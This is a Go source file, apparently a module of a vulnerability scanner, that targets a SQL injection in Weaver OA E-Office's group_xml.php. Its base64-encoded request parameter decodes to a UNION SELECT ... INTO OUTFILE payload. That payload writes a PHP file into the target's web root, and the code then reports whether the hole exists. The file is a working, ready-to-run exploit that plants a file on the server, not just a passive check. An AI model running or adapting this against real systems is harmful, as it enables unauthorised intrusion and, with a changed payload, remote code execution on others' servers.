package ecology_group_xml_sqljni

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"io/ioutil"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func Run(url string) {
	vulnUrl := url + "/inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgcHJpbnQgInRlc3QiOz8+JywyLDMsNCw1LDYsNyw4IGludG8gb3V0ZmlsZSAnLi4vd2Vicm9vdC90ZXN0MTIzLnBocCddCg=="
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-09] 泛微OA E-Office group_xml.php SQL注入漏洞不存在")
		return
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	body := string(bodyBytes)

	if resp.StatusCode == 200 && strings.Contains(body, "test") {
		color.Green.Println("[+09] 泛微OA E-Office group_xml.php SQL注入漏洞存在 -> ", vulnUrl)
	} else {
		color.Red.Println("[-09] 泛微OA E-Office group_xml.php SQL注入漏洞不存在")
	}
}
